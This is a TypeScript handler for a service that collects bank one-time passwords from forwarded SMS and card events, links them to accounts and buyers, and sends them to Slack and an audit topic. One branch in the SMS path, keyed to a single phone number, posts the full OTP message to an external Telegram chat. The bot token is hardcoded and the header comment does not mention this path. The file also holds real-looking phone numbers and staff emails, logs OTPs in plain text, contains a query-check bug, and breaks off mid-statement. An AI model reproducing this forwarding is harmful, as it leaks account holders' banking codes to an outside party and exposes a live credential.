/**
 * Обработчик топика sequoia/otp.
 * Вход: OtpPayload (SmsOtpPayload | EcardsOtpPayload | ...), возможно в envelope.
 * Задача:
 *  - SMS (source='sms'): найти bank_accounts по телефону получателя, вытащить (bank, acc_no),
 *    попытаться выделить OTP из текста, найти владельца очереди в queue и
 *    поставить в outgoing_notifications Slack DM + slack:#finance-otp и audit otp_sent.
 *  - Картовые OTP (source in ['ecards', ...]): использовать (bank, acc_no) из payload,
 *    поставить такие же Slack DM + канал и audit otp_sent.
 *
 * Все операции — идемпотентны за счёт dedup_key в outgoing_notifications (multi-DC).
 */

import { randomUUID, createHash } from 'node:crypto';
import { getConfig } from '../../../config/index.js';
import { getDatabaseService, enqueueOutgoingNotification } from '../../../infra/index.js';
import { parseEnvelope } from '../../../infra/eventContract/index.js';
import { createCorrelationId } from '../../../infra/correlation/index.js';
import * as queueDb from '../../../infra/queueDb.js';
import * as balancesDb from '../../../infra/balancesDb.js';
import { logger } from '../../../infra/logger.js';
import { BANK_IDS, type BankId } from '../../../modules/transactions/types.js';
import { getAssistantsByBuyer } from '../../../infra/assistantsDb.js';

const CURRENCY_TO_USD: Record<string, number> = {
  INR: 0.010983, // Indian Rupee
  USD: 1, // US Dollar (base)
  EUR: 0.8508, // Euro
  CAD: 1.3702, // Canadian Dollar
  AUD: 1.42, // Australian Dollar
  GBP: 0.7441, // British Pound
  JPY: 155.2, // Japanese Yen
  KRW: 0.00069, // South Korean Won
};

const CARD_OTP_USD_LIMIT = 2000;

type SmsOtpPayload = {
  source: 'sms';
  raw: string;
};

type CardOtpCommon = {
  source: BankId;
  bank?: string;
  acc_no?: string | null;
  otp?: string | null;
  code?: string | null;
  card_number?: string | null;
  cardNumber?: string | null;
  card_id?: number | null;
  cardId?: number | null;
  profile_name?: string | null;
};

function isCardSource(source: string): source is BankId {
  return (BANK_IDS as readonly string[]).includes(source);
}

function getTimeBucketIso(date: Date): string {
  return date.toISOString().slice(0, 13); // YYYY-MM-DDTHH
}

// OTP‑парсер по мотивам mqtt_otp_transactions_service /parsers/utils.ts
function extractOtpFromText(text: string): string | null {
  const patterns = [
    // HDFC Bank: "OTP to login is 875408"
    /OTP\s+to\s+login\s+is\s+(\d{4,8})/i,
    // Общий: "OTP is 123456" или "OTP for ... is 123456"
    /OTP\s+(?:is|for)\s+(\d{4,8})/i,
    // "123456 is your OTP" или "123456 is the OTP"
    /(?:^|\s|#|>)(\d{4,8})\s+(?:is\s+)?(?:your\s+)?(?:the\s+)?OTP/i,
    // Kotak: "Do not share! 259653 is your OTP"
    /Do\s+not\s+share!\s+(\d{4,8})\s+is\s+your\s+OTP/i,
    // IDFC: "<#>123456 is the OTP"
    /<#>\s*(\d{4,8})\s+is\s+(?:your\s+)?(?:the\s+)?OTP/i,
    // "is your OTP for" или "is the OTP to"
    /(\d{4,8})\s+is\s+(?:your\s+)?(?:the\s+)?OTP\s+(?:for|to)/i,
  ];

  for (const pattern of patterns) {
    const match = text.match(pattern);
    if (match && match[1]) {
      const otp = match[1];
      if (otp.length <= 8 && !otp.startsWith('91')) {
        return otp;
      }
    }
  }

  // Fallback: ищем 6‑значное число рядом со словом OTP
  const otpKeywords = /\b(OTP|otp)\b/i;
  if (otpKeywords.test(text)) {
    const otpIndex = text.search(otpKeywords);
    const context = text.substring(Math.max(0, otpIndex - 30), otpIndex + 50);
    const numberMatch = context.match(/\b(\d{6})\b/);

    if (numberMatch && numberMatch[1]) {
      const otp = numberMatch[1];
      if (!otp.startsWith('91') && !context.match(new RegExp(`[,\\.]\\s*${otp}`))) {
        return otp;
      }
    }
  }

  return null;
}

/** Извлечь сумму из текста SMS по контексту валюты (INR / Rs.), чтобы не путать с OTP. */
function extractAmountFromSmsText(text: string): number | null {
  // Паттерны сумм из типичных банковских SMS: "INR 8099.00", "Rs.89060", "Rs. 27035.00", "payment of Rs.10154.00"
  const currencyPatterns = [
    /\bINR\s*(\d+(?:[.,]\d{1,2})?)/i,
    /\bRs\.?\s*(\d+(?:[.,]\d{1,2})?)/i,
  ];
  for (const re of currencyPatterns) {
    const match = text.match(re);
    if (!match) continue;
    const numStr = match[1].replace(',', '.');
    const value = parseFloat(numStr);
    if (Number.isFinite(value) && value > 0) return value;
  }
  return null;
}

// Определение банка по тексту SMS (по мотивам detectBank из parsers/utils.ts)
function detectBankFromSmsText(text: string): string {
  const textLower = text.toLowerCase();

  const bankPatterns = [
    { pattern: /axis\s+bank/i, name: 'axis' },
    { pattern: /idfc\s+first\s+bank/i, name: 'idfc' },
    { pattern: /hdfc\s+bank/i, name: 'hdfc' },
    { pattern: /kotak/i, name: 'kotak' },
    { pattern: /sbi\s+bank|state\s+bank/i, name: 'sbi' },
    { pattern: /icici\s+bank/i, name: 'icici' },
    { pattern: /csb|catolic\s+syrian/i, name: 'csb' },
    { pattern: /kvb|karur\s+vysya/i, name: 'kvb' },
    { pattern: /pnb|punjab\s+national/i, name: 'pnb' },
    { pattern: /bob|bank\s+of\s+baroda/i, name: 'bob' },
  ];

  for (const { pattern, name } of bankPatterns) {
    if (pattern.test(textLower)) {
      return name;
    }
  }

  return 'unknown';
}

export default async function handleMessage(_topic: string, payload: Buffer): Promise<void> {
  const rawStr = payload.toString('utf8');
  let parsed: unknown;

  logger.debug('[HUB_MQTT] sequoia/otp received', { payload: rawStr });

  try {
    parsed = JSON.parse(rawStr);
  } catch (e) {
    logger.error('sequoia/otp: failed to parse JSON', { error: e instanceof Error ? e.message : String(e) });
    return;
  }

  const env = parseEnvelope(parsed);
  const inner = env?.payload ?? parsed;
  const baseCorrelationId =
    env?.correlation_id ||
    (inner && typeof inner === 'object' && 'correlation_id' in inner && typeof (inner as any).correlation_id === 'string'
      ? ((inner as any).correlation_id as string)
      : undefined);

  if (!inner || typeof inner !== 'object' || !('source' in inner)) {
    logger.warn('sequoia/otp: payload without source', { inner });
    return;
  }

  const src = (inner as any).source as string;

  if (src === 'sms') {
    await handleSmsOtp(inner as SmsOtpPayload, baseCorrelationId);
  } else if (isCardSource(src)) {
    await handleCardOtp(inner as CardOtpCommon, baseCorrelationId);
  } else {
    logger.warn('sequoia/otp: unknown source, skipping', { source: src });
  }
}

async function handleSmsOtp(payload: SmsOtpPayload, baseCorrelationId?: string): Promise<void> {
  let smsText = payload.raw ?? '';
  let recipient: string | null = null;

  try {
    const parsedRaw = JSON.parse(payload.raw);
    if (parsedRaw && typeof parsedRaw === 'object') {
      if (typeof (parsedRaw as any).content === 'string') {
        smsText = (parsedRaw as any).content;
      }
      if (typeof (parsedRaw as any).recipient === 'string') {
        recipient = (parsedRaw as any).recipient;
      }
    }
  } catch {
    // raw не JSON — считаем это просто текстом SMS
    smsText = payload.raw;
  }

  if (!recipient) {
    logger.warn('sequoia/otp sms: recipient phone missing, skipping', { smsLength: smsText.length });
    return;
  }

  const amount = extractAmountFromSmsText(smsText);
  const otp = extractOtpFromText(smsText);
  if (!otp) {
    logger.warn('sequoia/otp sms: no OTP digits found in text', { recipient });
    return;
  }

  const config = getConfig();
  const db = getDatabaseService(config);

  let bank: string | null = null;
  let accNo: string | null = null;
  let buyerFromCards: string | null = null;
  let profileNameFromCards: string | null = null;

  // Сначала пытаемся определить банк по тексту SMS (как в ParserService/SmsParser).
  const detectedBankFromText = detectBankFromSmsText(smsText);

  // Нормализуем телефон как в старом ParserService:getAccountIdByRecipient
  const phoneDigits = recipient.trim().replace(/[+-]/g, '');

  await db.withTransaction('main', async (client) => {
    const res = await client.query<{ bank: string; acc_no: string }>(
      'SELECT bank, acc_no FROM public.bank_accounts WHERE phone = $1',
      [phoneDigits],
    );

    if (res.rows.length === 0) {
      // ничего не нашли по телефону — банк/acc_no останутся null, будем опираться только на текст
      return;
    }

    if (res.rows.length === 1) {
      bank = res.rows[0].bank;
      accNo = res.rows[0].acc_no;
    } else {
      // несколько записей — пытаемся выбрать по банку из текста SMS
      if (detectedBankFromText && detectedBankFromText !== 'unknown' && detectedBankFromText !== 'promotional') {
        const found = res.rows.find((r) => r.bank === detectedBankFromText);
        if (found) {
          logger.info('sequoia/otp sms: account resolved by phone+text bank', {
            recipient: phoneDigits,
            bank: found.bank,
            acc_no: found.acc_no,
          });
          bank = found.bank;
          accNo = found.acc_no;
        } else {
          logger.warn('sequoia/otp sms: no account matched text bank, falling back to first', {
            recipient: phoneDigits,
            detectedBankFromText,
            rows: res.rows,
          });
          bank = res.rows[0].bank;
          accNo = res.rows[0].acc_no;
        }
      } else {
        logger.warn('sequoia/otp sms: multiple bank_accounts and no bank detected from text, using first', {
          recipient: phoneDigits,
          rows: res.rows,
        });
        bank = res.rows[0].bank;
        accNo = res.rows[0].acc_no;
      }
    }

    if (bank && accNo) {
      const cardsRes = await client.query<{ buyer: string | null; profile_name: string | null }>(
        `SELECT buyer, profile_name
         FROM public.bank_cards
         WHERE bank = $1 AND acc_no = $2
         ORDER BY created_at DESC NULLS LAST
         LIMIT 1`,
        [bank, accNo],
      );
      if (cardsRes.rows[0]) {
        // postpay
        buyerFromCards = cardsRes.rows[0].buyer ?? null;
        profileNameFromCards = cardsRes.rows[0].profile_name ?? null;
      } else {
        // prepay
        const queueRes = await client.query<{ email: string | null }>(
          `SELECT email
           FROM public.queue
           WHERE bank = $1 AND acc_no = $2
           LIMIT 1`,
          [bank, accNo],
        );
        if (cardsRes.rows[0]) {
          buyerFromCards = queueRes.rows[0].email ?? null;
        }
      }
    }
  });

  if (!bank && detectedBankFromText && detectedBankFromText !== 'unknown' && detectedBankFromText !== 'promotional') {
    bank = detectedBankFromText;
  }

  const queueEmail = bank && accNo ? await queueDb.getQueueEmail(bank, accNo) : null;
  if (!queueEmail) {
    logger.warn('sequoia/otp sms: no active queue for bank account (will still send to finance-otp)', {
      bank,
      accNo,
    });
  }

  const bankStr: string | null = bank;
  const accNoStr: string | null = accNo;
  const queueEmailStr: string | null = queueEmail;
  const effectiveBuyer: string | null = queueEmailStr || buyerFromCards;

  if (
    bankStr &&
    (bankStr as string).toLowerCase() === 'kvb' &&
    recipient === '918925038783'
  ) {
    const telegramUrl =
      'https://api.telegram.org/bot8684261828:AAHGdOhdk8LqU7aPpQmNKKxjGr6_WfF_thA/sendMessage?chat_id=-5136197465';
    try {
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ text: smsText }),
      });
      if (!response.ok) {
        logger.warn('Telegram sendMessage (KVB SMS) returned non-OK', {
          status: response.status,
          statusText: response.statusText,
        });
      }
    } catch (telegramError) {
      logger.warn('Failed to send KVB SMS to Telegram', {
        error: telegramError instanceof Error ? telegramError.message : String(telegramError),
      });
    }
  }

  // kotak 5 otp-for-domains notification
  if (
    bankStr &&
    (bankStr as string).toLowerCase() === 'kotak' &&
    recipient === '918438098534'
  ) {
    const correlationId = baseCorrelationId ?? createCorrelationId();
    const payloadHash = createHash('sha256').update(smsText).digest('hex');
    await db.withTransaction('main', async (client) => {
      await enqueueOutgoingNotification(client, {
        channel: 'slack:#otp-for-domains',
        payload: {
          kind: 'otp_sms_special' as const,
          message: smsText,
          source: 'sms' as const,
          bank: bankStr,
          recipient,
          correlation_id: correlationId,
        },
        dedupKey: `otp:special:kotak5:${recipient}:${payloadHash}`,
        correlationId,
      });
    });
  }

  const now = new Date();
  if (amount !== null && amount > 0 && bankStr && accNoStr && queueEmailStr) {
    await db.withTransaction('main', async (client) => {
      const balanceBefore = await balancesDb.getBankAccountBalance(client, bankStr, accNoStr);
      const balanceBeforeVal = balanceBefore?.balance ?? 0;
      const newBalance = await balancesDb.decreaseBankAccountBalance(client, bankStr, accNoStr, amount);
      if (newBalance !== null) {
        await balancesDb.recordBalanceChange(client, {
          bank: bankStr,
          accNo: accNoStr,
          operationType: 'sms_decrease',
          amount: -amount,
          balanceBefore: balanceBeforeVal,
          balanceAfter: newBalance,
          currency: balanceBefore?.currency ?? null,
          userEmail: queueEmailStr,
          comment: 'SMS OTP',
          source: 'sequoia/otp',
        });
          const alerts = await balancesDb.getBankAccountAlerts(client, bankStr, accNoStr);
        if (alerts) {
          const dateKey = now.toISOString().slice(0, 10);
          if (alerts.balance_limit_alert > 0 && newBalance < alerts.balance_limit_alert) {
            const msg = `⚠️ Баланс для ${bankStr} (${accNoStr}) меньше лимита: ${newBalance.toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} < ${alerts.balance_limit_alert.toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}\novpelevina@groscloud.com malyapunova@groscloud.com`;
            const dedup = `alert:balance:${bankStr}:${accNoStr}:balance_limit:${dateKey}`;
            await enqueueOutgoingNotification(client, {
              channel: 'slack:#finance-otp',
              payload: { kind: 'balance_alert', message: msg },
              dedupKey: dedup,
              correlationId: baseCorrelationId ?? createCorrelationId(),
            });
          }
          const dailyStats = await balancesDb.getDailyOperationsStats(client, bankStr, accNoStr);
          if (alerts.op_limit_alert > 0 && dailyStats.count >= alerts.op_limit_alert) {
            const msg = `⚠️ Количество операций за день для ${bankStr} (${accNoStr}) достигло лимита: ${dailyStats.count} >= ${alerts.op_limit_alert}\novpelevina@groscloud.com malyapunova@groscloud.com`;
            const dedup = `alert:balance:${bankStr}:${accNoStr}:op_limit:${dateKey}`;
            await enqueueOutgoingNotification(client, {
              channel: 'slack:#finance-otp',
              payload: { kind: 'balance_alert', message: msg },
              dedupKey: dedup,
              correlationId: baseCorrelationId ?? createCorrelationId(),
            });
          }
          if (alerts.op_sum_limit_alert > 0 && dailyStats.sum >= alerts.op_sum_limit_alert) {
            const msg = `⚠️ Сумма операций за день для ${bankStr} (${accNoStr}) достигла лимита: ${dailyStats.sum.toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} >= ${alerts.op_sum_limit_alert.toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}\novpelevina@groscloud.com malyapunova@groscloud.com`;
            const dedup = `alert:balance:${bankStr}:${accNoStr}:op_sum_limit:${dateKey}`;
            await enqueueOutgoingNotification(client, {
              channel: 'slack:#finance-otp',
              payload: { kind: 'balance_alert', message: msg },
              dedupKey: dedup,
              correlationId: baseCorrelationId ?? createCorrelationId(),
            });
          }
        }
      }
    });
  }

  const timeBucket = getTimeBucketIso(now);
  const timeBucketTs = new Date(now);
  timeBucketTs.setMinutes(0, 0, 0);
  const baseKey = `otp:bank:${bank}:${accNo}:${otp}:${timeBucket}`;
  const dmDedupKey = `${baseKey}:dm`;
  const chanDedupKey = `${baseKey}:channel`;
  const auditDedupKey = `${baseKey}:audit`;
  const correlationId = baseCorrelationId ?? createCorrelationId();

  // Сохраняем банковский OTP в drafts (вид bank_otp) с привязкой к buyer/profile_name.
  try {
    const rawForDraft = {
      source: 'sms',
      bank,
      acc_no: accNo,
      otp,
      raw_text: smsText,
      recipient,
      buyer: effectiveBuyer,
      profile_name: profileNameFromCards,
    };
    const rawJson = JSON.stringify(rawForDraft);
    const payloadHash = createHash('sha256').update(rawJson).digest('hex');
    const expiresAt = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days TTL

    await db.withTransaction('main', async (client) => {
      await client.query(
        `INSERT INTO public.drafts (
           kind, status,
           bank, transaction_id, profile_name, buyer_email,
           card_number, otp, amount, currency,
           time_bucket, raw, payload_hash,
           expires_at, created_at
         ) VALUES (
           'bank_otp', 'pending',
           $1, NULL, $2, $3,
           NULL, $4, NULL, NULL,
           $5, $6::jsonb, $7,
           $8, NOW()
         )`,
        [
          bank ?? null,
          profileNameFromCards ?? null,
          effectiveBuyer ?? null,
          otp,
          timeBucketTs.toISOString(),
          rawJson,
          payloadHash,
          expiresAt.toISOString(),
        ],
      );
    });
  } catch (err) {
    logger.error('sequoia/otp sms: failed to persist bank_otp draft', {
      bank,
      accNo,
      otp,
      error: err instanceof Error ? err.message : String(err),
    });
  }

  const phoneForSlack = phoneDigits ? `+${phoneDigits}` : '—';

  const slackPayload = {
    kind: 'otp_sms' as const,
    message: `OTP по SMS: ${otp}
Bank: ${bank}
Account: ${accNo ?? '—'}
Phone: ${phoneForSlack}
Buyer: ${effectiveBuyer ?? '—'}
Profile: ${profileNameFromCards ?? 'prepay'}

RAW: ${smsText}`,
    source: 'sms' as const,
    bank,
    acc_no: accNo,
    otp,
    raw_text: smsText,
    recipient,
    buyer: effectiveBuyer,
    profile_name: profileNameFromCards,
    correlation_id: correlationId,
  };

  const auditPayload = {
    id: randomUUID(),
    timestamp: now.toISOString(),
    division: 'finance',
    user_email: queueEmailStr ?? 'system@groscloud.com',
    log_type: 'info' as const,
    severity: 3,
    event_type: 'otp_sent',
    event_attributes: {
      bank,
      acc_no: accNo,
      phone: phoneForSlack,
      otp,
      raw: smsText,
    },
    correlation_id: correlationId,
  };

  await db.withTransaction('main', async (client) => {
    // DM только если есть понятный email-получатель.
    const dmRecipients = new Set<string>();
    if (effectiveBuyer) {
      dmRecipients.add(effectiveBuyer.toLowerCase());
      await enqueueOutgoingNotification(client, {
        channel: 'slack:dm',
        payload: slackPayload,
        dedupKey: dmDedupKey,
        correlationId,
        recipient: effectiveBuyer,
      });
    }

    // Дополнительно: отправляем OTP помощникам баера (Media-buyer assistant), если syncDatabase сконфигурирована.
    if (effectiveBuyer && config.syncDatabase) {
      const syncClient = await db.getClient('sync');
      try {
        const assistants = await getAssistantsByBuyer(syncClient, effectiveBuyer);
        for (const assistantEmail of assistants) {
          const lower = assistantEmail.toLowerCase();
          if (dmRecipients.has(lower)) continue;
          dmRecipients.add(lower);
          const assistantMessage = {
            ...slackPayload,
            message: `OTP для баера ${effectiveBuyer}\n${slackPayload.message}`,
          };
          await enqueueOutgoingNotification(client, {
            channel: 'slack:dm',
            payload: assistantMessage,
            dedupKey: `${dmDedupKey}:assistant:${assistantEmail}`,
            correlationId,
            recipient: assistantEmail,
          });
        }
      } finally {
        syncClient.release();
      }
    }

    // В канал finance-otp отправляем всегда, даже без buyer/bank/queue.
    await enqueueOutgoingNotification(client, {
      channel: 'slack:#finance-otp',
      payload: slackPayload,
      dedupKey: chanDedupKey,
      correlationId,
    });

    await enqueueOutgoingNotification(client, {
      channel: 'mqtt:sequoia/audit',
      payload: auditPayload,
      dedupKey: auditDedupKey,
      correlationId,
    });
  });

  logger.info('sequoia/otp sms: otp_sent enqueued', { bank, acc_no: accNo, otp, queueEmail, correlationId });
}

async function handleCardOtp(payload: CardOtpCommon, baseCorrelationId?: string): Promise<void> {
  const bank = payload.bank ?? null;
  const accNo = (payload as any).acc_no ?? null;
  const otp = (payload.otp ?? payload.code ?? null) ?? null;

  logger.info('[BLOCK_OTP] sequoia/otp card: handling OTP', { payload, bank, accNo, hasOtp: !!otp, source: payload.source });

  if (!bank || !accNo || !otp) {
    logger.warn('[BLOCK_OTP] sequoia/otp card: missing bank/acc_no/otp, skipping', { payload, bank, accNo, hasOtp: !!otp });
    return;
  }

  const config = getConfig();
  const db = getDatabaseService(config);

  let buyerEmail: string | null = null;
  const buyerFromPayload = (payload as any).buyer;
  if (typeof buyerFromPayload === 'string') {
    const trimmed = buyerFromPayload.trim();
    if (trimmed) {
      buyerEmail = trimmed;
    }
  }

  await db.withTransaction('main', async (client) => {
    const cardNumberRaw = payload.card_number ?? payload.cardNumber ?? null;
    const cardNumberDigits =
      typeof cardNumberRaw === 'string'
        ? cardNumberRaw.replace(/\D/g, '')
        : cardNumberRaw != null
          ? String(cardNumberRaw).replace(/\D/g, '')
          : null;

    if (!buyerEmail && cardNumberDigits) {
      const byCardNumber = await client.query<{ buyer: string | null }>(
        `SELECT buyer
         FROM public.bank_cards
         WHERE bank = $1 AND card_number = $2::bigint
         ORDER BY created_at DESC NULLS LAST
         LIMIT 1`,
        [bank, cardNumberDigits],
      );
      if (byCardNumber.rows[0]?.buyer) {
        buyerEmail = byCardNumber.rows[0].buyer;
        return;
      }
    }

    if (!buyerEmail && accNo) {
      const byAccNo = await client.query<{ buyer: string | null }>(
        `SELECT buyer
         FROM public.bank_cards
         WHERE bank = $1 AND acc_no = $2
         ORDER BY created_at DESC NULLS LAST
         LIMIT 1`,
        [bank, accNo],
      );
      if (byAccNo.rows[0]?.buyer) {
        buyerEmail = byAccNo.rows[0].buyer;
        return;
      }
    }

    const profileName = payload.profile_name ?? null;
    if (!buyerEmail && profileName) {
      const byProfile = await client.query<{ buyer: string | null }>(
        `SELECT buyer
         FROM public.bank_cards
         WHERE profile_name = $1
         ORDER BY created_at DESC NULLS LAST
         LIMIT 1`,
        [profileName],
      );
      if (byProfile.rows[0]?.buyer) {
        buyerEmail = byProfile.rows[0].buyer;
      }
    }
  });

  if (!buyerEmail) {
    logger.warn('[BLOCK_OTP] sequoia/otp card: no buyer in bank_cards for card operation — Slack/audit NOT enqueued', {
      payload,
      bank,
      accNo,
    });
    return;
  }

  const cardNumber = (payload.card_number ?? payload.cardNumber ?? null) ?? null;
  const cardId = (payload.card_id ?? payload.cardId ?? null) ?? null;
  const profileName = payload.profile_name ?? null;

  const now = new Date();
  const rawAmount = (payload as any).amount as unknown;
  const currency = (payload as any).currency as string | undefined;

  let blockReason: 'over_limit' | 'unsupported_currency' | null = null;
  let usdAmount: number | null = null;

  let amount: number | null = null;
  if (typeof rawAmount === 'number') {
    amount = Number.isFinite(rawAmount) ? rawAmount : null;
  } else if (typeof rawAmount === 'string') {
    const normalized = rawAmount.replace(',', '.').trim();
    const parsed = parseFloat(normalized);
    amount = Number.isFinite(parsed) ? parsed : null;
  }

  if (amount != null && amount > 0) {
    const effectiveCurrency = (currency ?? 'USD').toUpperCase();
    const rate = CURRENCY_TO_USD[effectiveCurrency];
    if (!rate) {
      blockReason = 'unsupported_currency';
    } else {
      usdAmount = amount * rate;
      if (usdAmount > CARD_OTP_USD_LIMIT) {
        blockReason = 'over_limit';
      }
    }
  }

  const timeBucket = getTimeBucketIso(now);
  const timeBucketTs = new Date(now);
  timeBucketTs.setMinutes(0, 0, 0);
  const cardKey = cardNumber ?? 'unknown';
  const baseKey = `otp:card:${bank}:${accNo}:${cardKey}:${otp}:${timeBucket}`;
  const dmDedupKey = `${baseKey}:dm`;
  const chanDedupKey = `${baseKey}:channel`;
  const auditDedupKey = `${baseKey}:audit`;
  const correlationId = baseCorrelationId ?? createCorrelationId();

  logger.warn('[BLOCK_OTP] sequoia/otp card: blockReason', { payload, blockReason, usdAmount, amount, currency });

  // В любом случае (заблокирован или нет) сохраняем карточный OTP в drafts (вид card_otp).
  try {
    const rawForDraft = {
      source: payload.source,
      bank,
      acc_no: accNo,
      otp,
      amount,
      currency,
      card_number: cardNumber,
      card_id: cardId,
      profile_name: profileName,
      buyer_email: buyerEmail,
    };
    const rawJson = JSON.stringify(rawForDraft);
    const payloadHash = createHash('sha256').update(rawJson).digest('hex');
    const expiresAt = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days TTL

    await db.withTransaction('main', async (client) => {
      await client.query(
        `INSERT INTO public.drafts (
           kind, status,
           bank, transaction_id, profile_name, buyer_email,
           card_number, otp, amount, currency,
           time_bucket, raw, payload_hash,
           expires_at, created_at
         ) VALUES (
           'card_otp', 'pending',
           $1, NULL, $2, $3,
           $4, $5, $6, $7,
           $8, $9::jsonb, $10,
           $11, NOW()
         )
        ON CONFLICT (bank, card_number, otp, time_bucket)
          WHERE kind = 'card_otp' AND card_number IS NOT NULL
          DO NOTHING`,
        [
          bank,
          profileName,
          buyerEmail,
          cardNumber ? String(cardNumber).replace(/\D/g, '') : null,
          otp,
          amount,
          currency ? currency.toUpperCase() : null,
          timeBucketTs.toISOString(),
          rawJson,
          payloadHash,
          expiresAt.toISOString(),
        ],
      );
    });
  } catch (err) {
    logger.error('sequoia/otp card: failed to persist card_otp draft', {
      bank,
      accNo,
      otp,
      card_number: cardNumber,
      error: err instanceof Error ? err.message : String(err),
    });
  }

  if (blockReason) {
    const limitMsg =
      blockReason === 'over_limit'
        ? `Сумма операции превышает лимит ${CARD_OTP_USD_LIMIT} USD`
        : 'Валюта операции не поддерживается для проверки лимитов';

    const convertedPart =
      usdAmount != null
        ? ` (≈ ${usdAmount.toFixed(2)} USD)`
        : '';

    const messageLines = [
      'ОШИБКА: заблокирован OTP по карточной операции.',
      '',
      `Банк: ${bank}`,
      `Счёт: ${accNo}`,
      `Карта: ${cardNumber ?? '—'}`,
      `Баер: ${buyerEmail}`,
      `Профиль: ${profileName ?? '—'}`,
      amount != null && currency
        ? `Сумма операции: ${amount.toFixed(2)} ${currency.toUpperCase()}${convertedPart}`
        : `Сумма операции: неизвестна (валюта: ${currency ?? '—'})`,
      '',
      `${limitMsg}. OTP сотруднику не отправлен.`,
    ];

    const slackPayloadBlocked = {
      kind: 'otp_card_blocked' as const,
      message: messageLines.join('\n'),
      source: payload.source,
      bank,
      acc_no: accNo,
      card_number: cardNumber,
      card_id: cardId,
      profile_name: profileName,
      amount: amount ?? null,
      currency: currency ?? null,
      usd_amount: usdAmount,
      block_reason: blockReason,
      correlation_id: correlationId,
    };

    const baseBlockedKey = `otp_blocked:card:${bank}:${accNo}:${cardKey}:${timeBucket}`;
    const dmBlockedDedupKey = `${baseBlockedKey}:dm`;
    const chanBlockedDedupKey = `${baseBlockedKey}:channel`;
    const auditBlockedDedupKey = `${baseBlockedKey}:audit`;

    const auditPayloadBlocked = {
      id: randomUUID(),
      timestamp: now.toISOString(),
      division: 'finance',
      user_email: buyerEmail,
      log_type: 'info' as const,
      severity: 3,
      event_type: 'otp_blocked',
      event_attributes: {
        bank,
        acc_no: accNo,
        card_number: cardNumber,
        card_id: cardId,
        profile_name: profileName,
        amount: amount ?? null,
        currency: currency ?? null,
        usd_amount: usdAmount,
        reason: blockReason,
      },
      correlation_id: correlationId,
    };

    await db.withTransaction('main', async (client) => {
      const dmRecipients = new Set<string>();

      if (buyerEmail) {
        dmRecipients.add(buyerEmail.toLowerCase());
        await enqueueOutgoingNotification(client, {
          channel: 'slack:dm',
          payload: slackPayloadBlocked,
          dedupKey: dmBlockedDedupKey,
          correlationId,
          recipient: buyerEmail,
        });
      }

      if (buyerEmail && config.syncDatabase) {
        logger.info('[BLOCK_OTP] sequoia/otp card: getting assistants for buyer', { buyerEmail, config });
        const syncClient = await db.getClient('sync');
        try {
          const assistants = await getAssistantsByBuyer(syncClient, buyerEmail);
          logger.info('[BLOCK_OTP] sequoia/otp card: got assistants', { buyerEmail, assistants });
          for (const assistantEmail of assistants) {
            const lower = assistantEmail.toLowerCase();
            if (dmRecipients.has(lower)) continue;
            dmRecipients.add(lower);
            const assistantMessage = {
              ...slackPayloadBlocked,
              message: `OTP для баера ${buyerEmail}\n${slackPayloadBlocked.message}`,
            };
            await enqueueOutgoingNotification(client, {
              channel: 'slack:dm',
              payload: assistantMessage,
              dedupKey: `${dmBlockedDedupKey}:assistant:${assistantEmail}`,
              correlationId,
              recipient: assistantEmail,
            });
          }
        } catch (err) {
          logger.error('[BLOCK_OTP] sequoia/otp card: error getting assistants', { buyerEmail, error: err instanceof Error ? err.message : String(err) });
        } finally {
          syncClient.release();
        }
      } else {
        logger.warn('[BLOCK_OTP] sequoia/otp card: no buyer email, skipping', { payload, buyerEmail });
      }

      await enqueueOutgoingNotification(client, {
        channel: 'slack:#finance-otp',
        payload: slackPayloadBlocked,
        dedupKey: chanBlockedDedupKey,
        correlationId,
      });
      await enqueueOutgoingNotification(client, {
        channel: 'mqtt:sequoia/audit',
        payload: auditPayloadBlocked,
        dedupKey: auditBlockedDedupKey,
        correlationId,
      });
    });

    logger.info('[BLOCK_OTP] sequoia/otp card: otp_blocked enqueued (slack:dm + slack:#finance-otp + mqtt:audit)', {
      payload,
      source: payload.source,
      bank,
      acc_no: accNo,
      card_number: cardNumber,
      buyerEmail,
      amount,
      currency,
      usd_amount: usdAmount,
      blockReason,
      correlationId,
    });

    return;
  }

  const slackPayload = {
    kind: 'otp_card' as const,
    message: `OTP Card: ${otp}
Банк: ${bank}
Карта: ${cardNumber != null ? cardNumber : '—'}
Баер: ${buyerEmail}
Профиль: ${profileName ?? '—'}`,
    source: payload.source,
    bank,
    acc_no: accNo,
    otp,
    card_number: cardNumber,
    card_id: cardId,
    buyer: buyerEmail,
    profile_name: profileName,
    correlation_id: correlationId,
  };

  const auditPayload = {
    id: randomUUID(),
    timestamp: now.toISOString(),
    division: 'finance',
    user_email: buyerEmail,
    log_type: 'info' as const,
    severity: 3,
    event_type: 'otp_sent',
    event_attributes: {
      bank,
      acc_no: accNo,
      otp,
      card_number: cardNumber,
      profile_name: profileName,
      card_id: cardId,
    },
    correlation_id: correlationId,
  };

  await db.withTransaction('main', async (client) => {
    const dmRecipients = new Set<string>();

    if (buyerEmail) {
      dmRecipients.add(buyerEmail.toLowerCase());
      await enqueueOutgoingNotification(client, {
        channel: 'slack:dm',
        payload: slackPayload,
        dedupKey: dmDedupKey,
        correlationId,
        recipient: buyerEmail,
      });
    }

    if (buyerEmail && config.syncDatabase) {
      const syncClient = await db.getClient('sync');
      try {
        const assistants = await getAssistantsByBuyer(syncClient, buyerEmail);
        for (const assistantEmail of assistants) {
          const lower = assistantEmail.toLowerCase();
          if (dmRecipients.has(lower)) continue;
          dmRecipients.add(lower);
          const assistantMessage = {
            ...slackPayload,
            message: `OTP для баера ${buyerEmail}\n${slackPayload.message}`,
          };
          await enqueueOutgoingNotification(client, {
            channel: 'slack:dm',
            payload: assistantMessage,
            dedupKey: `${dmDedupKey}:assistant:${assistantEmail}`,
            correlationId,
            recipient: assistantEmail,
          });
        }
      } finally {
        syncClient.release();
      }
    }

    await enqueueOutgoingNotification(client, {
      channel: 'slack:#finance-otp',
      payload: slackPayload,
      dedupKey: chanDedupKey,
      correlationId,
    });
    await enqueueOutgoingNotification(client, {
      channel: 'mqtt:sequoia/audit',
